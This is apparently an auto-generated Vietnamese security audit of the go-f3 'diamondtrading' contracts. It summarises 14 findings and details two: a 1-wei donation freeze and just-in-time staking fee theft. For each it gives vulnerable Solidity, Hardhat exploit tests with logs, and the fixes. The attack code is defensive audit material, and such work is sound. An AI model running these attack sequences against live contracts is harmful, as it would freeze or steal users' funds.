# WHITEPAPER — Audit bảo mật `diamondtrading/` (go-f3)

> File này được sinh tự động bởi `audit/report/build_whitepaper.py` từ `WHITEPAPER.src.md`.
> Mọi khối mã, khối PoC và khối log đều được trích trực tiếp từ file trong repo (không gõ tay).
> Muốn sửa nội dung: sửa `WHITEPAPER.src.md`, rồi chạy lại `python3 audit/report/build_whitepaper.py`.

| | |
|---|---|
| Dự án | go-f3 — module `diamondtrading/` (DiamondHouse, DiamondOptions, DiamondDistributor, RevenueSplit, Verifiers, DiamondToken, MockUSDC; engine off-chain; script deploy) |
| Repo / nhánh | `marssapcex/go-f3` / `arena/a5d74a8e-go-f3` |
| Commit gốc được audit | `3cb964b` (main) |
| Ngày lập báo cáo | 2026-10-24 |
| Môi trường kiểm thử | Hardhat 2.22.19 (EDR), chainId 31337, hardfork shanghai; solc-js 0.8.26 viaIR; Node.js local |
| Phạm vi tiền | Mọi đường USDC và DIAMOND: nạp/rút LP, mua vé/option, settle, hàng đợi thanh toán, stream phí, claim phần thưởng, mint DIAMOND, deploy |
| Trạng thái | 14 nhóm lỗi đã có PoC trên mã gốc, đã vá, đã kiểm lại trên mã vá. Các điểm rủi ro governance chưa vá, chờ quyết định (mục 6) |

---

## Mục lục

1. Tóm tắt điều hành
2. Phương pháp, phạm vi và cách tái lập
3. Kiến trúc và mô hình tin cậy
4. Chi tiết từng lỗi (F-01 đến F-14): mô tả, mã lỗi, PoC, log, đề xuất sửa, PoC và log sau sửa
5. Các điểm đã đánh giá nhưng chưa có PoC
6. Rủi ro còn lại và quyết định cần người dùng chốt
7. Kiểm chứng tổng hợp và giới hạn
8. Phụ lục: A. Diff bản vá; B. Log đầy đủ; C. Manifest SHA-256; D. Thuật ngữ

---

## 1. Tóm tắt điều hành

Đã tìm được **14 nhóm lỗi** (F-01 đến F-14). Mỗi nhóm có PoC chạy được trên Hardhat network local, chạy trên mã gốc để chứng minh lỗi, sau đó chạy lại trên mã đã vá để chứng minh lỗi đã hết và không sinh lỗi mới trong phạm vi các test.

Kết quả chạy cuối cùng:

- Mã gốc (nhánh `vulnerable`): **18 pass, 2 pending** (2 pending là test guard chỉ có ý nghĩa trên mã vá), 0 fail. Tất cả PoC lỗi đều tái hiện.
- Mã vá (nhánh `fixed`): **19 pass, 1 pending** (PoC F-07 chỉ có ý nghĩa trên mã gốc), 0 fail.
- Suite gốc của repo: diamond 133/133, engine 51/51, fuzz SEED=1337 OK (160 kiểm tra).

Cách đọc mức độ: mức độ dựa trên hai yếu tố, *tác động* (bao nhiêu tiền, ai mất) và *điều kiện khai thác* (kẻ tấn công cần gì). Đây là đánh giá định tính, không phải CVSS.

| ID | Mức | Loại | Tóm tắt | Tác động đo được trong PoC | Điều kiện |
|---|---|---|---|---|---|
| F-01 | High | Đóng băng (DoS) | 1 wei USDC chuyển thẳng vào House làm bất biến `==` sai, mọi thao tác revert | ~100,150 USDC kẹt vĩnh viễn | Ai cũng làm được, tốn 1 wei |
| F-02 | High | Ăn cắp | Stake JIT trước khi settle, ăn phí của staker khác | Kẻ tấn công 359.1 USDC (90%) trên 399 USDC phí | Ai cũng làm được, cần vốn DIAMOND |
| F-03 | Critical nếu root lộ / High nội bộ | Ăn cắp (mint) | Claim không kiểm `totalMint` đã đăng của epoch | Mint 1,000,000 DIAMOND trong khi budget 20,000 | Cần quyền đăng root (owner) |
| F-04 | High | Ăn cắp | Pool mồ côi (có tiền, không có share): nạp 1 wei được toàn bộ | Rút 1000.000001 USDC tiền của người chơi thua | Ai cũng làm được |
| F-05 | High | Ăn cắp | Share inflation qua donation + làm tròn xuống | Victim mất 499.499999 USDC, kẻ tấn công lãi 499.499999 | Ai cũng làm được, phải chịu thua cược ban đầu |
| F-06 | High | Ăn cắp của người thắng | `lpWithdraw` không trừ `queueDebt` | LP rút 100 USDC trong khi người thắng nợ 480.05 USDC | LP thường (không cần quyền) |
| F-07 | Critical nếu deploy bằng khoá công khai | Ăn cắp | Script deploy derive khoá ký từ mnemonic công khai | Rút 48,044.9 USDC từ pool 100,000 | Chỉ khi deploy dùng khoá mặc định |
| F-08 | High (phụ thuộc owner) | Ăn cắp | `setRevenueSink` không kiểm code, approve vô hạn, không thu hồi | EOA rút 102,000 USDC (gồm stake đang mở) | Owner đặt sink xấu hoặc sink cũ bị lộ |
| F-09 | High (kinh tế) | Thiệt hại kinh tế | `ttl` không nằm trong chữ ký quote, người mua chọn thời hạn | EV người mua +33.5% (ttl 30) so với −4.0% (ttl 60) | Ai cũng làm được |
| F-10 | Medium | Thiệt hại kinh tế | Quote dùng lại được trong cửa sổ hiệu lực | 5/5 vé mua trên cùng một giá cũ | Ai cũng làm được |
| F-11 | Medium (High nếu token có blocklist) | DoS hàng đợi | Một payee bị token từ chối làm revert mọi settle/harvest | Pool 1000 USDC bị kẹt, mọi settle khác revert | Token có blocklist (USDC thật có) |
| F-12 | Low | Vệ sinh | (a) queue entry bằng 0; (b) chữ ký rỗng khi chưa đặt `budgetAttester` | Rác trong queue; postEpoch không ký được chấp nhận | Trường hợp biên |
| F-13 | Medium | Kẹt tiền | Doanh thu nhận khi chưa có staker bị bỏ mất | 1000 USDC kẹt vĩnh viễn trong sink | Chưa có staker |
| F-14 | High | Farm / mint quá mức | Ledger tính phí hai lần và trần 200% | Farmer lãi +1900.36 USD ở M=1.92 | Ai cũng làm được (off-chain + DIAMOND) |

---

## 2. Phương pháp, phạm vi và cách tái lập

### 2.1 Phạm vi

- Toàn bộ `contracts/` trong `diamondtrading/` (7 file Solidity).
- `engine/` (ledger, quoter, pricer, caps): phần off-chain tính anchor, ký quote và tính giá, vì ảnh hưởng trực tiếp đến số DIAMOND được mint.
- `scripts/deploy.js`: vì khoá ký nằm ở đây.
- Không nằm trong phạm vi: hạ tầng vận hành (KMS/HSM, máy chủ oracle, monitoring), chuỗi thật, và token USDC thật (chỉ mô phỏng bằng `MockUSDC` và `BlocklistUSDC`).

### 2.2 Phương pháp

1. **Đọc mã có chủ đích theo đường tiền.** Với mỗi lệnh chuyển token (`transfer`, `transferFrom`, `approve`) và mỗi thay đổi số dư nội bộ (`pool`, `openStakes`, `queueDebt`, `totalShares`, `rewardIndex`), tôi xác định ai gọi được, ở trạng thái nào, và kết quả ra sao.
2. **Mô hình hoá kẻ tấn công.** Với mỗi đường tiền, tự đặt câu hỏi: kẻ tấn công cần vốn gì, cần quyền gì, đi theo thứ tự nào, và được gì. Các kịch bản được ghi lại trong từng mục ở mục 4.
3. **Viết PoC trước khi tin.** Một lỗi chỉ được ghi là "đã xác nhận" khi test chạy được và tái hiện đúng hành vi tiền. Các giả thuyết chưa viết được PoC được tách riêng (mục 5).
4. **Vá và kiểm lại.** Sau khi vá, cùng một test được chạy ở nhánh `fixed` và phải cho kết quả mong đợi. Tôi kiểm thêm suite gốc của repo để bắt hồi quy.
5. **Fuzz và suite có sẵn.** `test/fuzz.js` (SEED=1337) và `test/diamond.test.js`, `test/engine.test.js` của repo.

### 2.3 Cơ chế hai nhánh (vulnerable / fixed)

- Nhánh `vulnerable` dùng **snapshot byte-identical** của mã gốc `3cb964b` (thư mục `audit/vulnerable/`). Nó được build bằng cùng solc-js, cùng cấu hình, nên PoC chạy trên đúng mã đã gây lỗi.
- Nhánh `fixed` dùng mã hiện tại trong `contracts/`, `engine/`, `scripts/`.
- Biến môi trường `AUDIT_SET=vulnerable|fixed` chọn nhánh. Harness `audit/lib/world.js` dùng biến này để deploy đúng bộ artifact cho mọi contract (xem mục 7.3 về lỗi harness đã sửa).

### 2.4 Cách tái lập

Chạy từ thư mục `diamondtrading/`:

```
npm install
npm run audit:poc       # build + PoC trên mã gốc, kỳ vọng: 18 passing, 2 pending
npm run audit:regress   # build + cùng bộ test trên mã vá, kỳ vọng: 19 passing, 1 pending
npm test                # suite gốc: compile + diamond (133) + engine (51) + fuzz (SEED=1337)
```

Log đầy đủ của các lần chạy cuối nằm trong `audit/evidence/` (xem Phụ lục B).

---

## 3. Kiến trúc và mô hình tin cậy

### 3.1 Các thành phần

| Thành phần | Vai trò | Giữ tiền gì |
|---|---|---|
| `DiamondHouse` | Sổ cược nhị phân (vé): mua, settle, trả thưởng, hàng đợi, LP nạp/rút | `pool` (vốn LP + phần thua), `openStakes` (stake đang mở), `queueDebt` (nợ hàng đợi), `totalCredits` (credit, từ mục F-11) |
| `DiamondOptions` | Sổ option (spread có chặn) | `pool`, `openPremiums`, `queueDebt`, `totalCredits` |
| `DiamondDistributor` | Phát DIAMOND theo epoch bằng Merkle root | Không giữ USDC; có quyền mint DIAMOND |
| `RevenueSplit` | Staking DIAMOND, nhận phí USDC và phát thưởng | USDC phí đang stream; `carry`; `credits` |
| `Verifiers` (MultiAttester / MultiPrice) | Kiểm kết quả trận đấu / giá đóng bằng chữ ký N-of-M | Không giữ tiền |
| `DiamondToken` | Token DIAMOND, mint có kiểm soát bởi minter | — |
| Quoter (off-chain) | Ký quote (EIP-712) cho người mua | — |
| `scripts/deploy.js` | Deploy và thiết lập quyền | — |

Luồng tiền chính: người chơi nạp `stake` → `openStakes` → khi settle: thắng thì trả `S + profit` từ pool (có thể vào hàng đợi), thua thì `S` vào pool, và phí thắng được chia 0.99% founder / 3.00% stakers (`RevenueSplit`).

### 3.2 Mô hình tin cậy

| Thực thể | Mức tin cậy | Hệ quả nếu bị xâm phạm |
|---|---|---|
| Owner | Có quyền cấu hình (sink, class cap, minter, targetPool, verifier, attester) | Có thể rút pool (F-08 và mục 5.2) |
| Quoter key | Tin cậy ký đúng giá và đúng thời hạn | Ký quote có lợi cho người mua |
| Attester keys (N-of-M) | Tin cậy ký đúng kết quả | Ký WON giả → rút pool (F-07 nếu khoá công khai) |
| Budgeter key | Tin cậy ký đúng budget epoch | Cho phép budget sai (F-12b, D2) |
| Root poster (owner) | Tin cậy đăng đúng Merkle root | Mint vượt budget (F-03) |
| USDC | Chuẩn ERC20, nhưng **có thể** blocklist | Gây DoS hàng đợi (F-11) |
| Người chơi / LP / staker | Không tin cậy | Mọi lỗi người dùng khai thác được ghi ở mục 4 |

---

## 4. Chi tiết từng lỗi

Mỗi lỗi có cùng cấu trúc: mô tả và nguyên nhân gốc, kịch bản khai thác, mã lỗi (lấy từ snapshot gốc), PoC (lấy từ file test), log PoC trên mã gốc, đề xuất sửa, mã sau sửa, PoC sau sửa (cùng test, nhánh fixed), log sau sửa, và đánh giá phần còn lại.

Lưu ý khi đọc log: đường dẫn log là file trong `audit/evidence/per-file/`. Các dòng `[EVIDENCE]` là số liệu do chính test in ra khi chạy.

---

### 4.1 F-01 — 1 wei donation đóng băng House và Options

**Mức độ:** High. **Loại:** đóng băng (DoS). **Không mất tiền trực tiếp**, nhưng khoá toàn bộ tiền trong contract.

#### Mô tả và nguyên nhân gốc

`lanesIntact()` kiểm tra **bằng nhau** giữa số dư token của contract và `pool + openStakes`. Đây là bất biến quá chặt. Bất kỳ ai chuyển trực tiếp USDC vào contract (không qua hàm nào) đều làm số dư lớn hơn tổng nội bộ, và bất biến sai vĩnh viễn. Mọi hàm có `require(lanesIntact(), "lane drift")` bị revert: mua vé, settle, harvest, rút LP, refund. Không có hàm nào rút phần thừa, nên tiền bị khoá không lấy lại được.

#### Kịch bản khai thác

1. Kẻ tấn công chuyển 1 wei USDC trực tiếp vào `DiamondHouse` bằng `transfer`.
2. Bất biến trở thành sai. Người chơi khác gọi `buyTicket` → revert `lane drift`.
3. Settle, harvest, LP rút, refund đều revert tương tự.
4. Toàn bộ pool và stake đang mở bị khoá. Không ai (kể cả owner) rút được qua các hàm chuẩn.

#### Mã lỗi (mã gốc `3cb964b`)

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 147–151*

```solidity

    /// Cash-lane invariant: every wei in the contract belongs to exactly one lane.
    function lanesIntact() public view returns (bool) {
        return balance() == pool + openStakes;
    }
```


Các điểm kiểm tra dùng bất biến này trong House: dòng 212, 268, 280, 329, 343, 365, 382. Trong Options: `DiamondOptions.sol` dòng 190, 227, 258, 284.

*`audit/vulnerable/contracts/DiamondOptions.sol` · dòng 117–121*

```solidity
    }

    function lanesIntact() public view returns (bool) {
        return usdc.balanceOf(address(this)) == pool + openPremiums;
    }
```


#### PoC

*`audit/test/F01-donation-freeze.test.js` · dòng 13–54*

```javascript
  it("House: 1-wei donation freezes buy / settle / harvest / refund / LP exit", async () => {
    const W = await makeWorld({ withOptions: false });
    const { lp, p1, p2, p5 } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    const liveId = await buyTicket(W, p1, 100, 2);                 // ticket sold BEFORE the attack (settled below)
    const stallId = await buyTicket(W, p1, 50, 2);                 // second, never-settled ticket for the refund leg
    await (await W.house.connect(lp).lpRequestExit(await W.house.lpShares(lp.address))).wait();

    await (await W.usdc.connect(p5).transfer(W.hA, 1n)).wait();    // THE ATTACK: 1 wei, raw transfer
    console.log(`  [EVIDENCE] attacker p5 sent 1 wei USDC to House. lanesIntact()=${await W.house.lanesIntact()}`);

    const q = await signHouseQuote(W, { stake: U(10), multX1e4: X(2) }, p2);
    const rBuy = await revertOf(W.house.connect(p2).buyTicket(q.q, q.sig, X(2), 60));
    console.log(`  [EVIDENCE] buyTicket by honest p2            → ${rBuy ?? "OK"}`);
    const rSettle = await revertOf(settleHouse(W, liveId, 2));      // KNOCKED: loser stake → pool
    console.log(`  [EVIDENCE] settleWithProof(id, KNOCKED)      → ${rSettle ?? "OK"}`);
    const rHarvest = await revertOf(W.house.connect(p2).harvest(1));
    console.log(`  [EVIDENCE] harvest(1)                        → ${rHarvest ?? "OK"}`);
    await timeTravel(7 * 86400 + 60);
    const rExit = await revertOf(W.house.connect(lp).lpWithdraw());
    console.log(`  [EVIDENCE] lpWithdraw() after 7d lock        → ${rExit ?? "OK"}`);
    await timeTravel(2 * 86400);                                    // stall window (expiry+24h)
    const rRefund = await revertOf(W.house.connect(p1).refundAfterStall(stallId));
    console.log(`  [EVIDENCE] refundAfterStall(unsettled id) after stall → ${rRefund ?? "OK"}`);
    if (!isFixed()) {
      console.log(`  [EVIDENCE] stuck USDC in House = ${await W.usdc.balanceOf(W.hA)} (6dp) — no sweep function exists`);
      for (const r of [rBuy, rSettle, rHarvest, rExit, rRefund]) expect(r).to.equal("lane drift");
    } else {
      for (const r of [rBuy, rSettle, rHarvest, rExit, rRefund]) expect(r).to.equal(null);
      // the donation is surplus, not a lane: only the owner can sweep it, and only the surplus
      const owed = (await W.house.pool()) + (await W.house.openStakes()) + (await W.house.totalCredits());
      const surplus = (await W.usdc.balanceOf(W.hA)) - owed;
      console.log(`  [EVIDENCE] fixed: surplus (donation) in House = ${surplus} wei; owed = ${owed}`);
      expect(surplus > 0n).to.equal(true);
      const rStranger = await revertOf(W.house.connect(p5).sweepSurplus(p5.address));
      expect(rStranger).to.equal("not owner");
      const b0 = await W.usdc.balanceOf(W.signers.owner.address);
      expect(await revertOf(W.house.connect(W.signers.owner).sweepSurplus(W.signers.owner.address))).to.equal(null);
      expect((await W.usdc.balanceOf(W.signers.owner.address)) - b0).to.equal(surplus);
      expect(await W.house.lanesIntact()).to.equal(true);
    }
  });
```


*`audit/test/F01-donation-freeze.test.js` · dòng 56–66*

```javascript
  it("Options: 1-wei donation blocks new option sales and settlement", async () => {
    const W = await makeWorld();
    const { p1, p5 } = W.signers;
    const q1 = await signOptionQuote(W, { premium: U(100), multX1e4: 20_000 }, p1);
    await (await W.options.connect(p1).buyOption(q1.q, q1.sig, q1.q.strikeX1e8, 60)).wait();
    await (await W.usdc.connect(p5).transfer(W.oA, 1n)).wait();
    const q2 = await signOptionQuote(W, { premium: U(10), multX1e4: 20_000 }, p1);
    const rBuy = await revertOf(W.options.connect(p1).buyOption(q2.q, q2.sig, q2.q.strikeX1e8, 60));
    console.log(`  [EVIDENCE] Options.buyOption after donation  → ${rBuy ?? "OK"}`);
    expect(rBuy).to.equal(isFixed() ? null : "lane drift");
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F01-donation-freeze.txt`*

```text
  [EVIDENCE] attacker p5 sent 1 wei USDC to House. lanesIntact()=false
  [EVIDENCE] buyTicket by honest p2            → lane drift
  [EVIDENCE] settleWithProof(id, KNOCKED)      → lane drift
  [EVIDENCE] harvest(1)                        → lane drift
  [EVIDENCE] lpWithdraw() after 7d lock        → lane drift
  [EVIDENCE] refundAfterStall(unsettled id) after stall → lane drift
  [EVIDENCE] stuck USDC in House = 100150000001 (6dp) — no sweep function exists
    ✔ House: 1-wei donation freezes buy / settle / harvest / refund / LP exit (886ms)
```


*`vulnerable-F01-donation-freeze.txt`*

```text
  [EVIDENCE] Options.buyOption after donation  → lane drift
    ✔ Options: 1-wei donation blocks new option sales and settlement (144ms)
```


#### Đề xuất sửa

Đổi bất biến từ **bằng nhau** sang **đủ tiền** (solvency): contract phải *giữ ít nhất* những gì nó nợ. Phần thừa do chuyển nhầm không làm hỏng bất biến. Thêm hàm `sweepSurplus` chỉ cho owner rút phần thừa, và chỉ phần thừa. Tổng nợ phải bao gồm `totalCredits` (xem F-11).

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 170–188*

```solidity
    /// Cash-lane invariant (F-01 fix): the contract must HOLD at least what it owes.
    /// Surplus (accidental transfers) cannot freeze the protocol; owner may sweep it.
    function lanesIntact() public view returns (bool) {
        return balance() >= pool + openStakes + totalCredits;
    }
    /// NAV available to LPs: queued winners are senior (F-06).
    function navPool() public view returns (uint256) {
        return pool > queueDebt ? pool - queueDebt : 0;
    }
    /// Sweep of unallocated surplus only (donations); never touches pool / openStakes / credits.
    function sweepSurplus(address to) external onlyOwner nonReentrant {
        uint256 b = balance();
        uint256 owed = pool + openStakes + totalCredits;
        require(b > owed, "no surplus");
        require(usdc.transfer(to, b - owed), "sweep out");
    }
    function liveQueueEntries() public view returns (uint256) {
        return payoutQueue.length - queueHead;
    }
```


*`contracts/DiamondOptions.sol` · dòng 135–146*

```solidity

    /// F-01 fix: solvency, not equality. Donations cannot freeze the book.
    function lanesIntact() public view returns (bool) {
        return usdc.balanceOf(address(this)) >= pool + openPremiums + totalCredits;
    }
    function sweepSurplus(address to) external onlyOwner nonReentrant {
        uint256 b = usdc.balanceOf(address(this));
        uint256 owed = pool + openPremiums + totalCredits;
        require(b > owed, "no surplus");
        require(usdc.transfer(to, b - owed), "sweep out");
    }

```


#### PoC sau sửa (cùng test, nhánh `fixed`)

Test không đổi; nhánh `fixed` trong test kiểm: mọi thao tác thành công, `sweepSurplus` của người lạ bị từ chối với `not owner`, owner chỉ rút đúng phần thừa (1 wei), và `lanesIntact()` vẫn `true` sau khi sweep.

*`fixed-F01-donation-freeze.txt`*

```text
  [EVIDENCE] attacker p5 sent 1 wei USDC to House. lanesIntact()=true
  [EVIDENCE] buyTicket by honest p2            → OK
  [EVIDENCE] settleWithProof(id, KNOCKED)      → OK
  [EVIDENCE] harvest(1)                        → OK
  [EVIDENCE] lpWithdraw() after 7d lock        → OK
  [EVIDENCE] refundAfterStall(unsettled id) after stall → OK
  [EVIDENCE] fixed: surplus (donation) in House = 1 wei; owed = 10000001
    ✔ House: 1-wei donation freezes buy / settle / harvest / refund / LP exit (916ms)
```


*`fixed-F01-donation-freeze.txt`*

```text
  [EVIDENCE] Options.buyOption after donation  → OK
    ✔ Options: 1-wei donation blocks new option sales and settlement (145ms)
```


#### Đánh giá sau sửa

- Đóng băng đã hết. Phần thừa vẫn nằm trong contract cho tới khi owner sweep. Đây là đánh đổi có chủ đích, đã ghi trong mã.
- Owner có quyền sweep: phải được xem như một quyền vận hành và ghi trong tài liệu.

---

### 4.2 F-02 — Stake JIT ăn phí của staker trung thực

**Mức độ:** High. **Loại:** ăn cắp của người khác. **Không cần quyền đặc biệt.**

#### Mô tả và nguyên nhân gốc

`RevenueSplit.notifyRevenue` cộng phí vào `rewardIndex` **ngay lập tức**, chia cho `totalStaked` tại thời điểm đó. Phần thưởng không được tích luỹ theo thời gian. Người stake ngay trước khi phí về sẽ nhận gần như toàn bộ phí, dù họ chỉ stake vài giây.

#### Kịch bản khai thác

1. Staker trung thực đã stake 10,000 DIAMOND từ trước.
2. Kẻ tấn công thấy một vé thắng sắp settle (phí sắp về). Hắn stake 90,000 DIAMOND.
3. Settle xảy ra: phí ~399 USDC được cộng vào `rewardIndex` chia cho tổng 100,000 DIAMOND. Kẻ tấn công nhận 90%.
4. Kẻ tấn công claim và rút stake ngay trong cùng khoảng thời gian ngắn.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/RevenueSplit.sol` · dòng 85–92*

```solidity
    function notifyRevenue(uint256 amount) external {
        require(msg.sender == house || pusher[msg.sender], "not house");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay in");
        if (totalStaked > 0) {
            rewardIndex += amount * 1e18 / totalStaked;
        }
        emit RevenueNotified(amount, rewardIndex);
    }
```


#### PoC

*`audit/test/F02-jit-stake-reward-theft.test.js` · dòng 15–63*

```javascript
  it("attacker staking 9x the honest stake right before a fee event takes ~90% of the fee", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { owner, lp, p1, relayer } = W.signers;
    const honest = W.signers.p2, attacker = W.signers.p3;

    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    // DIAMOND: owner mints to honest staker + attacker (demo genesis-style allocation)
    await (await W.diamond.setMinter(owner.address)).wait();
    await (await W.diamond.mint(honest.address, E18(10_000))).wait();
    await (await W.diamond.mint(attacker.address, E18(90_000))).wait();
    // honest staker is in place long before the event
    await (await W.diamond.connect(honest).approve(W.sA, ethers.MaxUint256)).wait();
    await (await W.sink.connect(honest).stake(E18(10_000))).wait();
    await (await W.diamond.connect(attacker).approve(W.sA, ethers.MaxUint256)).wait();

    // a winning ticket is sold and then settled; the settle streams 3% of profit to stakers
    const id = await buyTicket(W, p1, 10_000, 2);     // profit 10,000 → fee 399 USDC
    // ── attacker front-runs the settle: stake 90,000 DIAMOND in the block BEFORE it ──
    await (await W.sink.connect(attacker).stake(E18(90_000))).wait();
    await (await settleHouse(W, id, 1)).wait();       // WON → _streamFee → notifyRevenue
    // attacker claims immediately and exits the principal request (7-day lock)
    const bBefore = await W.usdc.balanceOf(attacker.address);
    const c1 = await W.sink.claimable(attacker.address);
    await (await W.sink.connect(attacker).claimReward()).wait();
    const gotAttacker = (await W.usdc.balanceOf(attacker.address)) - bBefore;
    await (await W.sink.connect(attacker).requestUnbond(E18(90_000))).wait();

    // let the 7-day stream run out; the attacker has already left (principal in unbonding)
    await timeTravel(7 * 24 * 3600 + 60);
    await (await W.sink.connect(honest).claimReward()).wait();
    const honestGot = await W.usdc.balanceOf(honest.address);
    const honestEarned = honestGot - U(1_000_000);    // honest started with 1M USDC minted

    console.log(`  [EVIDENCE] fee streamed to stakers (rewardIndex delta) ≈ 399 USDC`);
    console.log(`  [EVIDENCE] attacker (90k DIAMOND, staked 0s) claimable=${c1} paid=${gotAttacker} (base units, 6dp)`);
    console.log(`  [EVIDENCE] honest (10k DIAMOND, staked since genesis) earned=${honestEarned} (base units, 6dp) after the 7d stream`);
    const attackerShare = Number(gotAttacker) / Number(gotAttacker + honestEarned);
    console.log(`  [EVIDENCE] attacker share of the single fee event = ${(attackerShare * 100).toFixed(2)}%`);

    if (!isFixed()) {
      expect(attackerShare).gt(0.85);              // reproduces: ~90% stolen by a 0-second staker
    } else {
      // streaming rewards: nothing is claimable at the instant of the event
      expect(gotAttacker).lt(1_000n);              // < 0.001 USDC immediately
      expect(c1).lt(1_000n);
      // …and the attacker's principal leaves at once, so the honest staker captures the stream
      expect(honestEarned > U(398)).to.equal(true);   // ≈ the whole 399 USDC fee
    }
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F02-jit-stake-reward-theft.txt`*

```text
  [EVIDENCE] fee streamed to stakers (rewardIndex delta) ≈ 399 USDC
  [EVIDENCE] attacker (90k DIAMOND, staked 0s) claimable=359100000 paid=359100000 (base units, 6dp)
  [EVIDENCE] honest (10k DIAMOND, staked since genesis) earned=39900000 (base units, 6dp) after the 7d stream
  [EVIDENCE] attacker share of the single fee event = 90.00%
    ✔ attacker staking 9x the honest stake right before a fee event takes ~90% of the fee (877ms)
```


#### Đề xuất sửa

Phí phải được **stream theo thời gian** trong một cửa sổ cố định (ở đây 7 ngày), và người stake chỉ nhận phần thời gian họ thực sự đã stake. Khi không có staker, phần phí được giữ bằng `carry` và bắt đầu stream khi có staker đầu tiên (liên quan F-13). `SCALE = 1e36` để giữ độ chính xác cho index.

#### Mã sau sửa

*`contracts/RevenueSplit.sol` · dòng 85–108*

```solidity
    function _update() internal {
        uint256 nowTs = block.timestamp;
        if (nowTs <= lastUpdate) return;
        if (totalStaked == 0) {
            // paused: the stream's remaining time is preserved, not consumed by nobody
            if (periodFinish > lastUpdate) periodFinish += nowTs - lastUpdate;
            lastUpdate = nowTs;
            return;
        }
        uint256 t = nowTs < periodFinish ? nowTs : periodFinish;
        if (t > lastUpdate) rewardIndex += rewardRate * (t - lastUpdate) / totalStaked;
        lastUpdate = nowTs;
    }

    /// Add `amt` (plus any carry) to the running stream, keeping the unfinished remainder.
    function _addToStream(uint256 amt) internal {
        amt += carry; carry = 0;
        if (amt == 0) return;
        uint256 leftover = block.timestamp < periodFinish
            ? rewardRate * (periodFinish - block.timestamp) : 0;
        rewardRate = (amt * SCALE + leftover) / DURATION;
        periodFinish = block.timestamp + DURATION;
        lastUpdate = block.timestamp;
    }
```


*`contracts/RevenueSplit.sol` · dòng 148–160*

```solidity

    /// Authorized engines only; pulls exactly `amount` from msg.sender (House or Options).
    function notifyRevenue(uint256 amount) external {
        require(msg.sender == house || pusher[msg.sender], "not house");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay in");
        _update();
        if (totalStaked > 0) {
            _addToStream(amount);
        } else {
            carry += amount;                        // F-13: never stranded
            emit RevenueCarried(amount);
        }
        emit RevenueNotified(amount, rewardIndex);
```


#### PoC sau sửa

*`audit/test/F02-jit-stake-reward-theft.test.js` · dòng 15–63*

```javascript
  it("attacker staking 9x the honest stake right before a fee event takes ~90% of the fee", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { owner, lp, p1, relayer } = W.signers;
    const honest = W.signers.p2, attacker = W.signers.p3;

    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    // DIAMOND: owner mints to honest staker + attacker (demo genesis-style allocation)
    await (await W.diamond.setMinter(owner.address)).wait();
    await (await W.diamond.mint(honest.address, E18(10_000))).wait();
    await (await W.diamond.mint(attacker.address, E18(90_000))).wait();
    // honest staker is in place long before the event
    await (await W.diamond.connect(honest).approve(W.sA, ethers.MaxUint256)).wait();
    await (await W.sink.connect(honest).stake(E18(10_000))).wait();
    await (await W.diamond.connect(attacker).approve(W.sA, ethers.MaxUint256)).wait();

    // a winning ticket is sold and then settled; the settle streams 3% of profit to stakers
    const id = await buyTicket(W, p1, 10_000, 2);     // profit 10,000 → fee 399 USDC
    // ── attacker front-runs the settle: stake 90,000 DIAMOND in the block BEFORE it ──
    await (await W.sink.connect(attacker).stake(E18(90_000))).wait();
    await (await settleHouse(W, id, 1)).wait();       // WON → _streamFee → notifyRevenue
    // attacker claims immediately and exits the principal request (7-day lock)
    const bBefore = await W.usdc.balanceOf(attacker.address);
    const c1 = await W.sink.claimable(attacker.address);
    await (await W.sink.connect(attacker).claimReward()).wait();
    const gotAttacker = (await W.usdc.balanceOf(attacker.address)) - bBefore;
    await (await W.sink.connect(attacker).requestUnbond(E18(90_000))).wait();

    // let the 7-day stream run out; the attacker has already left (principal in unbonding)
    await timeTravel(7 * 24 * 3600 + 60);
    await (await W.sink.connect(honest).claimReward()).wait();
    const honestGot = await W.usdc.balanceOf(honest.address);
    const honestEarned = honestGot - U(1_000_000);    // honest started with 1M USDC minted

    console.log(`  [EVIDENCE] fee streamed to stakers (rewardIndex delta) ≈ 399 USDC`);
    console.log(`  [EVIDENCE] attacker (90k DIAMOND, staked 0s) claimable=${c1} paid=${gotAttacker} (base units, 6dp)`);
    console.log(`  [EVIDENCE] honest (10k DIAMOND, staked since genesis) earned=${honestEarned} (base units, 6dp) after the 7d stream`);
    const attackerShare = Number(gotAttacker) / Number(gotAttacker + honestEarned);
    console.log(`  [EVIDENCE] attacker share of the single fee event = ${(attackerShare * 100).toFixed(2)}%`);

    if (!isFixed()) {
      expect(attackerShare).gt(0.85);              // reproduces: ~90% stolen by a 0-second staker
    } else {
      // streaming rewards: nothing is claimable at the instant of the event
      expect(gotAttacker).lt(1_000n);              // < 0.001 USDC immediately
      expect(c1).lt(1_000n);
      // …and the attacker's principal leaves at once, so the honest staker captures the stream
      expect(honestEarned > U(398)).to.equal(true);   // ≈ the whole 399 USDC fee
    }
  });
```


Ghi chú: test này có nhánh `isFixed()` riêng. Với nhánh fixed, nó kiểm: kẻ tấn công nhận gần 0, staker trung thực nhận gần như toàn bộ phí sau 7 ngày.

*`fixed-F02-jit-stake-reward-theft.txt`*

```text
  [EVIDENCE] fee streamed to stakers (rewardIndex delta) ≈ 399 USDC
  [EVIDENCE] attacker (90k DIAMOND, staked 0s) claimable=0 paid=593 (base units, 6dp)
  [EVIDENCE] honest (10k DIAMOND, staked since genesis) earned=398998812 (base units, 6dp) after the 7d stream
  [EVIDENCE] attacker share of the single fee event = 0.00%
    ✔ attacker staking 9x the honest stake right before a fee event takes ~90% of the fee (883ms)
```


#### Đánh giá sau sửa

- Kẻ tấn công vẫn nhận 593 base units (0.000593 USDC). Đó là phần thời gian thật sự đã stake, theo đúng tỷ lệ, không phải lỗi.
- Staker trung thực nhận 398.998812 USDC sau 7 ngày. Chênh lệch so với 399 USDC là do làm tròn.
- Rủi ro còn lại: người stake dài hạn vẫn được hưởng nhiều hơn người stake ngắn hạn. Đây là thiết kế, không phải lỗ hổng.

---

